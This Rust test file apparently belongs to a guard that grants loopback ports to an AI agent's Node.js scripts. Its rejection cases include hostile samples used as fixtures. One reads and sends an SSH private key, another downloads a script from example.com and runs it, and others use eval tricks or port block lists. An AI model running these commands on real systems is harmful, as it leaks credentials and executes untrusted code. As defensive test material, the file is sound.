use std::collections::BTreeSet;

use super::super::{code_lines, Language};
use super::node_loopback_ports;

/// A static file server an agent starts to look at the page it built.
const STATIC_SERVER: &str = "const http=require('node:http'),fs=require('node:fs'),path=require('node:path');const types={'.html':'text/html','.js':'text/javascript','.css':'text/css'};http.createServer((q,r)=>{const p=path.join(process.cwd(),q.url==='/'?'index.html':q.url);fs.readFile(p,(e,b)=>{r.writeHead(e?404:200,{'Content-Type':types[path.extname(p)]||'application/octet-stream'});r.end(e?'not found':b)})}).listen(4173,'127.0.0.1')";
/// The same server checking its own pages once it listens.
const SELF_CHECK: &str = "const http=require(\"node:http\"),fs=require(\"node:fs\");http.createServer((q,r)=>{fs.readFile(\".\"+q.url,(e,b)=>{r.writeHead(e?404:200);r.end(b)})}).listen(8765,\"127.0.0.1\",async()=>{for(const p of [\"/index.html\",\"/game.js\"]){const res=await fetch(\"http://127.0.0.1:8765\"+p);console.log(p,res.status)}process.exit(0)})";
/// A smoke test that starts the project's server and requests its root.
const SPAWNED_SERVER: &str = "import { spawn } from \"node:child_process\"; import assert from \"node:assert/strict\"; const child = spawn(process.execPath, [\"server.js\"], { stdio: \"inherit\" }); await new Promise((resolve) => setTimeout(resolve, 500)); const response = await fetch(\"http://127.0.0.1:3000/\"); assert.equal(response.status, 200); child.kill()";

/// These judge with no home, so Guard's whole default daemon range stays
/// closed.
fn ports(source: &str) -> Option<BTreeSet<u16>> {
    node_loopback_ports(&code_lines(Language::Node, source), None)
}

fn program_ports(sources: &[String]) -> Option<BTreeSet<u16>> {
    super::program_ports(sources, None)
}

fn launch_ports(command: &[String]) -> Vec<u16> {
    super::launch_loopback_ports(command, None, None)
}

fn set(ports: &[u16]) -> Option<BTreeSet<u16>> {
    Some(ports.iter().copied().collect())
}

#[test]
fn loopback_servers_and_fetches_name_their_ports() {
    assert_eq!(ports(STATIC_SERVER), set(&[4173]));
    assert_eq!(ports(SELF_CHECK), set(&[8765]));
    assert_eq!(ports(SPAWNED_SERVER), set(&[3000]));
    assert_eq!(
        ports("const response = await fetch('http://localhost:3001/');\nconsole.log(response.status);\n"),
        set(&[3001])
    );
    assert_eq!(
        ports("import { createServer } from 'node:http';\ncreateServer((q, r) => r.end('ok')).listen(3001, 'localhost');\n"),
        set(&[3001])
    );
}

#[test]
fn other_network_use_keeps_the_review() {
    for source in [
        // Administrative loopback ports.
        "await fetch('http://127.0.0.1:2375/containers/json')",
        "await fetch('http://localhost:4781/approve')",
        "require('node:http').createServer().listen(9229, '127.0.0.1')",
        // Local data stores and brokers: the grant is raw TCP for the whole
        // contained tree, so a spawned child could speak their own protocol.
        "await fetch('http://127.0.0.1:5432/')",
        "await fetch('http://localhost:3306/')",
        "await fetch('http://127.0.0.1:27018/')",
        "await fetch('http://127.0.0.1:9092/')",
        // Every port a kube control-plane component binds, not only the three
        // this list used to name.
        "await fetch('http://127.0.0.1:10252/healthz')",
        // Code evaluated at run time, which this scan cannot follow.
        "await fetch('http://127.0.0.1:3000/'); eval(\"require('node:net').connect(3000, '127.0.0.1')\")",
        "await fetch('http://127.0.0.1:3000/'); (0, eval)('1')",
        "await fetch('http://127.0.0.1:3000/'); eval?.('1')",
        "const F = Function; F('return 1')(); await fetch('http://127.0.0.1:3000/')",
        "[].constructor.constructor('return 1')(); await fetch('http://127.0.0.1:3000/')",
        "await fetch('http://127.0.0.1:3000/'); new Function('return 1')()",
        "const name = 'node:net'; require(name); await fetch('http://127.0.0.1:3000/')",
        "require('node:vm'); await fetch('http://127.0.0.1:3000/')",
        "const s = \"require('node:net')\"; await fetch('http://127.0.0.1:3000/')",
        // Guard's daemon on a fixed or ephemeral port, and ports no dev
        // server conventionally binds.
        "await fetch('http://127.0.0.1:7392/v1/requests?status=pending')",
        "await fetch('http://127.0.0.1:54321/v1/requests')",
        "require('node:http').createServer().listen(9000, '127.0.0.1')",
        // Registered service ports as a class.
        "await fetch('http://127.0.0.1:631/')",
        "await fetch('http://localhost:22/')",
        // Hosts other than loopback.
        "await fetch('https://example.com/')",
        "await fetch('http://example.com:80/')",
        "await fetch('http://127.0.0.2:8080/')",
        "await fetch('http://localhost.example.com:8080/')",
        "await fetch('http://127.0.0.1:3000/'); await fetch('https://example.com/')",
        "const http = require('http');\nhttp.createServer().listen(3000, '127.0.0.1');\nawait fetch('http://example.com/');\n",
        // Dynamic ports and hosts.
        "const http = require('http');\nhttp.createServer().listen(0, '127.0.0.1');\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT, '127.0.0.1');\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT);\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT || '3000');\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT || 3000 + 1);\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT || 9229);\n",
        // Hosts other than loopback or every address.
        "const http = require('http');\nhttp.createServer().listen(3000, '192.168.1.5');\n",
        "const http = require('http');\nhttp.createServer().listen(3000, 'example.com');\n",
        "const http = require('http');\nconst HOST = '10.0.0.2';\nhttp.createServer().listen(3000, HOST);\n",
        "const http = require('http');\nhttp.createServer().listen(3000, process.env.HOST);\n",
        "const host = process.argv[2];\nawait fetch('http://' + host + ':3000/');\n",
        "const url = process.env.URL;\nawait fetch(url);\n",
        "await fetch(`http://127.0.0.1:${process.env.PORT}/`)",
        // Other network modules and HTTP clients.
        "const net = require('net');\nconst host = process.argv[2];\nnet.connect(80, host);\n",
        "import https from 'node:https';\nhttps.get('https://127.0.0.1:3000/');\n",
        "const http = require('http');\nhttp.get('http://127.0.0.1:3000/');\n",
        "const http = require('http');\nconst client = http;\nclient.get('http://127.0.0.1:3000/');\n",
        "const { request } = require('node:http');\nrequest('http://127.0.0.1:3000/').end();\n",
        "new WebSocket('ws://127.0.0.1:3000/')",
        // An import the binding forms do not name.
        "console.log(require('http').STATUS_CODES[200])",
        // A credential store alongside loopback traffic.
        "const fs = require('fs');\nconst key = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');\nawait fetch('http://127.0.0.1:3000/', { method: 'POST', body: key });\n",
        // A string left open hides what follows it.
        "await fetch('http://127.0.0.1:3000/'); const s = 'open",
    ] {
        assert_eq!(ports(source), None, "{source}");
    }
}

#[test]
fn imported_modules_must_stay_off_the_network() {
    let server = "const http = require('http');\nhttp.createServer().listen(3000, '127.0.0.1');\n";
    assert_eq!(program_ports(&[server.into()]), set(&[3000]));
    assert_eq!(
        program_ports(&[
            server.into(),
            "module.exports = (rows) => rows.length;\n".into()
        ]),
        set(&[3000])
    );
    assert_eq!(
        program_ports(&[
            server.into(),
            "module.exports = () => fetch('https://example.com');\n".into()
        ]),
        None
    );
}

fn shell(text: &str) -> Vec<String> {
    vec!["/bin/sh".into(), "-c".into(), text.into()]
}

#[test]
fn the_sandbox_reads_the_ports_from_the_command_it_runs() {
    assert_eq!(
        launch_ports(&shell(&format!(
            "node --test && node -e \"{STATIC_SERVER}\""
        ))),
        vec![4173]
    );
    assert_eq!(
        launch_ports(&shell(&format!(
            "node --input-type=module -e '{SPAWNED_SERVER}'"
        ))),
        vec![3000]
    );
    assert_eq!(
        launch_ports(&shell(
            "node -e \"fetch('http://127.0.0.1:3000/')\" && node -e \"fetch('http://localhost:3001/')\""
        )),
        vec![3000, 3001]
    );
    for text in [
        "node --test",
        "node -e \"fetch('http://127.0.0.1:3000/')\" && node -e \"fetch('https://example.com/')\"",
        "node -e \"fetch('http://127.0.0.1:2375/')\"",
        "node -e \"fetch('http://127.0.0.1:3000/')\" && python3 -c 'import socket'",
    ] {
        assert!(launch_ports(&shell(text)).is_empty(), "{text}");
    }
    let mut other = shell("node -e \"fetch('http://127.0.0.1:3000/')\"");
    other[0] = "/bin/bash".into();
    assert!(launch_ports(&other).is_empty());
}

/// A smoke test of a todo API that fetches every route off one loopback base.
const TODO_SMOKE: &str = "const base=\"http://127.0.0.1:3000\"; const page=await fetch(base); if(!page.ok) throw Error(\"web interface failed\"); let r=await fetch(base+\"/api/todos\",{method:\"POST\",headers:{\"content-type\":\"application/json\"},body:JSON.stringify({title:\"Smoke test\"})}); const todo=await r.json(); r=await fetch(base+\"/api/todos/\"+todo.id,{method:\"DELETE\"}); if(r.status!==204) throw Error(\"delete failed\"); console.log(\"smoke passed\");";

#[test]
fn a_loopback_base_bound_once_may_be_fetched() {
    assert_eq!(ports(TODO_SMOKE), set(&[3000]));
    assert_eq!(
        ports("const base = 'http://localhost:4173/app';\nconst page = await fetch(base, { method: 'HEAD' });\nconsole.log(page.status);\n"),
        set(&[4173])
    );
    assert_eq!(
        ports("const base = 'http://localhost:4173'\nconst page = await fetch(base)\nconsole.log(page.status)\n"),
        set(&[4173])
    );
    for source in [
        // A binding that can change, or one read anywhere but `fetch`.
        TODO_SMOKE.replace("const base=", "let base="),
        // A declaration's parameter is not a call of the global fetch.
        "const base='http://localhost:3000'; function fetch(base){}".to_owned(),
        "const base='http://localhost:3000'; function  fetch(base){}".to_owned(),
        "const base='http://localhost:3000'; function* fetch(base){}".to_owned(),
        "const base='http://localhost:3000'; const o={fetch(base){}};".to_owned(),
        TODO_SMOKE.replace(
            "const page=await fetch(base)",
            "const url=base; const page=await fetch(url)",
        ),
        TODO_SMOKE.replace(
            "const page=",
            "const base2=((base)=>fetch(base))(process.env.TARGET); const page=",
        ),
        TODO_SMOKE.replace(
            "const todo=",
            "{ const base=process.env.TARGET; await fetch(base) } const todo=",
        ),
        TODO_SMOKE.replace(
            "fetch(base+\"/api/todos\"",
            "other.fetch(base+\"/api/todos\"",
        ),
        // Text appended to the base that could name another host.
        TODO_SMOKE.replace("fetch(base+\"/api/todos\"", "fetch(base+\"@example.com/\""),
        TODO_SMOKE.replace("fetch(base+\"/api/todos\"", "fetch(base+process.env.SUFFIX"),
        // A line break that continues the binding's expression.
        TODO_SMOKE.replace("3000\";", "3000\"\n+ \"@example.com\";"),
        TODO_SMOKE.replace(
            "3000\";",
            "3000\"\n  .replace(\"127.0.0.1\", \"example.com\");",
        ),
        // Other bases.
        TODO_SMOKE.replace("127.0.0.1:3000", "127.0.0.1:2375"),
        TODO_SMOKE.replace("127.0.0.1:3000", "127.0.0.1"),
        TODO_SMOKE.replace("http://127.0.0.1:3000", "https://example.com"),
        TODO_SMOKE.replace("127.0.0.1:3000", "127.0.0.2:3000"),
        // A port the agent chose, with no daemon state to rule Guard out.
        TODO_SMOKE.replace("3000", "3147"),
    ] {
        assert_eq!(ports(&source), None, "{source}");
    }
}

#[test]
fn a_chosen_port_is_granted_while_the_daemon_records_another() {
    let home = std::env::temp_dir().join(format!("script-loopback-chosen-{}", std::process::id()));
    let guard = home.join(".hol-guard");
    std::fs::create_dir_all(&guard).unwrap();
    let home_dir = home.to_str();
    let chosen = code_lines(Language::Node, &TODO_SMOKE.replace("3000", "3147"));
    assert_eq!(
        node_loopback_ports(&chosen, home_dir),
        None,
        "no daemon state"
    );
    std::fs::write(guard.join("daemon-state.json"), r#"{"port": 4781}"#).unwrap();
    assert_eq!(node_loopback_ports(&chosen, home_dir), set(&[3147]));
    // Proxies, automation drivers and model servers stay closed.
    for port in [
        "1080", "4444", "5901", "8888", "9515", "11434", "4781", "49152",
    ] {
        let source = code_lines(Language::Node, &TODO_SMOKE.replace("3000", port));
        assert_eq!(node_loopback_ports(&source, home_dir), None, "{port}");
    }
    std::fs::write(guard.join("daemon-state.json"), r#"{"port": 3147}"#).unwrap();
    assert_eq!(
        node_loopback_ports(&chosen, home_dir),
        None,
        "daemon on 3147"
    );
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn a_dev_port_in_the_daemon_range_follows_the_daemon_state() {
    let home = std::env::temp_dir().join(format!("script-loopback-daemon-{}", std::process::id()));
    let guard = home.join(".hol-guard");
    std::fs::create_dir_all(&guard).unwrap();
    let vite = code_lines(Language::Node, "await fetch('http://localhost:5173/')");
    let home_dir = home.to_str();
    assert_eq!(
        node_loopback_ports(&vite, home_dir),
        None,
        "no daemon state"
    );
    std::fs::write(guard.join("daemon-state.json"), r#"{"port": 4781}"#).unwrap();
    assert_eq!(node_loopback_ports(&vite, home_dir), set(&[5173]));
    std::fs::write(guard.join("daemon-state.json"), r#"{"port": 5173}"#).unwrap();
    assert_eq!(node_loopback_ports(&vite, home_dir), None, "daemon on 5173");
    let _ = std::fs::remove_dir_all(&home);
}

#[test]
fn an_unread_relative_import_does_not_receive_the_loopback_grant() {
    let home = std::env::temp_dir().join(format!("script-loopback-import-{}", std::process::id()));
    let project = home.join("project");
    std::fs::create_dir_all(&project).unwrap();
    let home_dir = home.to_str().unwrap().to_owned();
    let cwd = project.to_str().unwrap().to_owned();
    let context = crate::pretool::PathContext {
        home_dir: Some(home_dir.as_str()),
        cwd: Some(cwd.as_str()),
        ..crate::pretool::PathContext::default()
    };
    let grant = |command: &str| {
        let model = crate::parse_command(&crate::CommandModelRequestV1 {
            command: command.to_owned(),
            dialect: "posix".into(),
            transport: "shell_string".into(),
            extraction_provenance: "pre-tool-generic".into(),
        })
        .unwrap();
        super::super::assess(&model, context)
            .into_iter()
            .find_map(|found| found.loopback)
    };
    assert_eq!(
        grant("node -e \"fetch('http://127.0.0.1:3000/')\""),
        set(&[3000])
    );
    assert_eq!(
        grant("node -e \"require('./missing.js'); fetch('http://127.0.0.1:3000/')\""),
        None
    );
    assert_eq!(
        grant("cd sub && node -e \"require('./x.js'); fetch('http://127.0.0.1:3000/')\""),
        None
    );
    let _ = std::fs::remove_dir_all(&home);
}

/// A server that names its port once and logs where it listens.
const PORT_CONSTANT_SERVER: &str = "const http = require('node:http');\nconst PORT = 4173;\nhttp.createServer((q, r) => r.end('ok')).listen(PORT, '127.0.0.1', () => {\n  console.log(`listening on http://127.0.0.1:${PORT}/`);\n});\n";

#[test]
fn a_port_constant_reads_as_its_literal() {
    assert_eq!(ports(PORT_CONSTANT_SERVER), set(&[4173]));
    assert_eq!(
        ports(
            "const PORT = 3001, HOST = 'localhost';\nawait fetch(`http://localhost:${ PORT }/`);\n"
        ),
        set(&[3001])
    );
    // A literal fallback is the only port granted; an override fails to bind.
    for source in [
        "const http = require('http');\nconst PORT = process.env.PORT || 3000;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = process.env.PORT ?? 3000;\nhttp.createServer().listen(PORT);\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT || 3000, () => console.log('up'));\n",
        "const http = require('http');\nhttp.createServer().listen(process.env.DEV_PORT ?? 3000, 'localhost');\n",
        "const http = require('http');\nconst PORT = Number(process.env.PORT || 3000);\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nhttp.createServer().listen(Number(process.env.PORT) || 3000);\n",
        "const http = require('http');\nhttp.createServer().listen(Number(process.env.PORT ?? 3000));\n",
        "const http = require('http');\nconst port = parseInt(process.env.PORT, 10) || 3000;\nhttp.createServer().listen(port);\n",
        "const http = require('http');\nconst PORT = process.env.PORT || process.env.DEV_PORT || 3000;\nhttp.createServer().listen(PORT);\n",
        // A parameter or destructuring default.
        "const http = require('http');\nfunction start(port = Number(process.env.PORT ?? 3000)) { return http.createServer().listen(port); }\n",
        "const http = require('http');\nconst start = ({ port = 3000 } = {}) => http.createServer().listen(port);\n",
        // A template expansion that reads as the same port.
        "const http = require('http');\nhttp.createServer().listen(process.env.PORT ?? 3000, () => console.log(`http://localhost:${process.env.PORT ?? 3000}`));\n",
        // A loopback base URL with no port, as request URLs are parsed.
        "const http = require('http');\nhttp.createServer((q, r) => r.end(new URL(q.url, 'http://localhost').pathname)).listen(3000);\n",
    ] {
        assert_eq!(ports(source), set(&[3000]), "{source}");
    }
    for source in [
        // A port taken from the environment or argv without a literal fallback.
        "const http = require('http');\nconst PORT = process.env.PORT;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = Number(process.env.PORT);\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = parseInt(process.env.PORT);\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = Number(process.env.PORT || '3000');\nhttp.createServer().listen(PORT);\n",
        "const http = require('http');\nhttp.createServer().listen(Number(process.env.PORT) + 1 || 3000);\n",
        "const http = require('http');\nhttp.createServer().listen(Number(process.argv[2]) || 3000);\n",
        // A parameter default bound twice, or also assigned.
        "const http = require('http');\nfunction a(port = 3000) {}\nfunction b(port = 3001) { http.createServer().listen(port); }\n",
        "const http = require('http');\nfunction start(port = 3000) { port = 9229; http.createServer().listen(port); }\n",
        "const http = require('http');\nfunction start(port = 3000) { port += 1; http.createServer().listen(port); }\n",
        "const http = require('http');\nfunction start(port = 3000) { port++; http.createServer().listen(port); }\n",
        "const http = require('http');\nfunction start(port = 3000) { let port; http.createServer().listen(port); }\n",
        // A loopback URL with no port is no grant for `fetch`.
        "await fetch('http://localhost/')",
        "const http = require('http');\nconst PORT = process.env.PORT || 9229;\nhttp.createServer().listen(PORT);\n",
        "const http = require('http');\nconst PORT = Number(process.argv[2]);\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        // A binding that is not a constant literal, or is declared again.
        "const http = require('http');\nlet PORT = 3000;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = 3000 + 1;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = 3000;\nfunction start() {\n  const PORT = 9229;\n  http.createServer().listen(PORT, '127.0.0.1');\n}\n",
        // A declaration spelled inside a string is not one.
        "const http = require('http');\nconst note = 'const PORT = 3000';\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        // Administrative, registered and non-dev ports stay closed by name too.
        "const http = require('http');\nconst PORT = 9229;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = 6379;\nhttp.createServer().listen(PORT, 'localhost');\n",
        "const http = require('http');\nconst PORT = 80;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        "const http = require('http');\nconst PORT = 9000;\nhttp.createServer().listen(PORT, '127.0.0.1');\n",
        // An expansion other than a port constant.
        "const PORT = 3000;\nawait fetch(`http://127.0.0.1:${PORT + 1}/`);\n",
        "const PORT = 3000;\nconst HOST = process.env.HOST;\nawait fetch(`http://${HOST}:${PORT}/`);\n",
    ] {
        assert_eq!(ports(source), None, "{source}");
    }
}

/// The server a model wrote for a todo app: a parameter default read from the
/// environment, a portless base URL and an expanded template.
const TODO_SERVER: &str = "import { createServer } from 'node:http';\nimport { readFile } from 'node:fs/promises';\nimport { extname, resolve, sep } from 'node:path';\nimport { fileURLToPath } from 'node:url';\n\nconst root = resolve(fileURLToPath(new URL('..', import.meta.url)));\nconst types = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8' };\n\nexport function startServer(port = Number(process.env.PORT ?? 3000)) {\n  const server = createServer(async (request, response) => {\n    try {\n      const pathname = decodeURIComponent(new URL(request.url, 'http://localhost').pathname);\n      const relative = pathname === '/' ? 'index.html' : pathname.slice(1);\n      const file = resolve(root, relative);\n      if (!file.startsWith(root + sep)) throw new Error('Not found');\n      const body = await readFile(file);\n      response.writeHead(200, { 'content-type': types[extname(file)] ?? 'application/octet-stream' });\n      response.end(body);\n    } catch {\n      response.writeHead(404, { 'content-type': 'text/plain; charset=utf-8' });\n      response.end('Not found');\n    }\n  });\n  return server.listen(port);\n}\n\nif (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {\n  startServer().on('listening', () => console.log(`Todo app listening on http://localhost:${process.env.PORT ?? 3000}`));\n}\n";

#[test]
fn a_server_reading_its_port_from_the_environment_earns_the_fallback() {
    assert_eq!(ports(TODO_SERVER), set(&[3000]));
}

/// A server with no host, or a wildcard one, earns its port too: on macOS
/// Seatbelt's `localhost` inbound rule already matches every local address,
/// so the grant bounds the port, not the interface, whatever the host.
#[test]
fn a_server_without_a_loopback_host_earns_its_port() {
    for source in [
        "const http = require('http');\nhttp.createServer().listen(4173);\n",
        "const http = require('http');\nhttp.createServer().listen(4173, () => console.log('up'));\n",
        "const http = require('http');\nhttp.createServer().listen(4173, function () {});\n",
        "const http = require('http');\nconst ready = () => {};\nhttp.createServer().listen(4173, ready);\n",
        "const http = require('http');\nconst PORT = 4173;\nhttp.createServer().listen(PORT);\n",
        "const http = require('http');\nconst PORT = 4173;\nhttp.createServer().listen(PORT, () => console.log(`up on ${PORT}`));\n",
        "const http = require('http');\nhttp.createServer().listen(4173, '0.0.0.0');\n",
        "const http = require('http');\nhttp.createServer().listen(4173, '::', () => {});\n",
    ] {
        assert_eq!(ports(source), set(&[4173]), "{source}");
    }
    // The port rules still apply.
    for source in [
        "const http = require('http');\nhttp.createServer().listen(9229);\n",
        "const http = require('http');\nhttp.createServer().listen(80, () => {});\n",
        "const http = require('http');\nhttp.createServer().listen(6379, '0.0.0.0');\n",
        "const http = require('http');\nhttp.createServer().listen(0);\n",
    ] {
        assert_eq!(ports(source), None, "{source}");
    }
}

/// A project below the target directory: macOS `$TMPDIR` resolves under
/// `/private/var`, which the read-path screen rejects for a script file.
fn project(name: &str) -> (std::path::PathBuf, std::path::PathBuf) {
    let home = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/script-loopback-tests")
        .join(format!("{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&home);
    let project = home.join("project");
    for (relative, text) in [
        ("server.js", "require('node:http').createServer((q, r) => r.end('ok')).listen(3000, '127.0.0.1');\n"),
        ("src/server.js", PORT_CONSTANT_SERVER),
        ("src/app.js", "const { route } = require('./routes');\nconst http = require('node:http');\nhttp.createServer(route).listen(4200, 'localhost');\n"),
        ("src/routes.js", "module.exports = { route: (q, r) => r.end('ok') };\n"),
        ("src/leaky.js", "const { route } = require('./report');\nconst http = require('node:http');\nhttp.createServer(route).listen(4200, 'localhost');\n"),
        ("src/report.js", "module.exports = { route: (q, r) => fetch('https://example.com/').then(() => r.end()) };\n"),
        ("src/partial.js", "require('./missing.js');\nrequire('node:http').createServer().listen(3000, '127.0.0.1');\n"),
        ("src/open.js", "require('node:http').createServer().listen(3000);\n"),
        ("src/env.js", "require('node:http').createServer().listen(process.env.PORT || 3000, '127.0.0.1');\n"),
        ("src/bare-env.js", "require('node:http').createServer().listen(process.env.PORT);\n"),
        ("src/lan.js", "require('node:http').createServer().listen(3000, '192.168.1.5');\n"),
        ("src/keys.js", "const fs = require('fs');\nconst key = fs.readFileSync(process.env.HOME + '/.ssh/id_ed25519');\nrequire('node:http').createServer((q, r) => r.end(key)).listen(3000, '127.0.0.1');\n"),
        ("src/remote.js", "require('node:http').createServer().listen(3000, '127.0.0.1');\nfetch('https://example.com/');\n"),
        ("src/admin.js", "require('node:http').createServer().listen(9229, '127.0.0.1');\n"),
        ("src/dynamic.js", "const name = process.argv[2];\nrequire(name);\nrequire('node:http').createServer().listen(3000, '127.0.0.1');\n"),
    ] {
        let path = project.join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
    let outside = home.join("elsewhere/server.js");
    std::fs::create_dir_all(outside.parent().unwrap()).unwrap();
    std::fs::write(
        &outside,
        "require('node:http').createServer().listen(3000, '127.0.0.1');\n",
    )
    .unwrap();
    (
        home.canonicalize().unwrap(),
        project.canonicalize().unwrap(),
    )
}

#[test]
fn a_workspace_script_earns_the_ports_it_serves_on() {
    let (home, project) = project("script");
    let home_dir = home.to_str().unwrap().to_owned();
    let cwd = project.to_str().unwrap().to_owned();
    let context = crate::pretool::PathContext {
        home_dir: Some(home_dir.as_str()),
        cwd: Some(cwd.as_str()),
        ..crate::pretool::PathContext::default()
    };
    let grant = |command: &str| {
        let model = crate::parse_command(&crate::CommandModelRequestV1 {
            command: command.to_owned(),
            dialect: "posix".into(),
            transport: "shell_string".into(),
            extraction_provenance: "pre-tool-generic".into(),
        })
        .unwrap();
        super::super::assess(&model, context)
            .into_iter()
            .find_map(|found| found.loopback)
    };
    let launch =
        |command: &str| super::launch_loopback_ports(&shell(command), Some(&cwd), Some(&home_dir));
    for (command, expected) in [
        ("node server.js", vec![3000]),
        ("node src/server.js", vec![4173]),
        ("node src/app.js", vec![4200]),
        ("echo starting && node src/app.js", vec![4200]),
        ("node src/open.js", vec![3000]),
        ("node src/env.js", vec![3000]),
    ] {
        let set: BTreeSet<u16> = expected.iter().copied().collect();
        assert_eq!(grant(command), Some(set), "{command}");
        assert_eq!(launch(command), expected, "{command}");
    }
    let outside = home.join("elsewhere/server.js");
    let outside = format!("node {}", outside.display());
    for command in [
        "node src/leaky.js",
        "node src/partial.js",
        "node src/bare-env.js",
        "node src/lan.js",
        "node src/keys.js",
        "node src/remote.js",
        "node src/admin.js",
        "node src/dynamic.js",
        outside.as_str(),
    ] {
        assert_eq!(grant(command), None, "{command}");
        assert!(launch(command).is_empty(), "{command}");
    }
    // One program that needs other network withholds the grant from all.
    assert!(launch("node server.js && node src/remote.js").is_empty());
    // After a directory change the relative script is not the one judged.
    assert!(launch("cd src && node server.js").is_empty());
    // A write of the script, then the launch, would run the replacement under
    // the grant read from the file that was there before the write.
    assert!(launch("echo 'listen(1)' > server.js && node server.js").is_empty());
    assert!(launch("cp src/server.js server.js && node server.js").is_empty());
    // Path by path matching would miss these: an import replaced, another
    // spelling of the script, and writers that name no file the scan sees.
    for command in [
        "cp src/leaky.js src/routes.js && node src/app.js",
        "cp src/leaky.js server.js && node ./server.js",
        "curl -o server.js https://example.com/s.js && node server.js",
        "node --test && node src/app.js",
        "npm run build && node server.js",
        "node src/app.js & cp src/leaky.js src/routes.js",
        "node src/app.js | cp src/leaky.js src/routes.js",
    ] {
        assert_eq!(grant(command), None, "{command}");
        assert!(launch(command).is_empty(), "{command}");
    }
    // Without a working directory to read it from, a script earns nothing.
    assert!(super::launch_loopback_ports(&shell("node server.js"), None, None).is_empty());
    let _ = std::fs::remove_dir_all(&home);
}
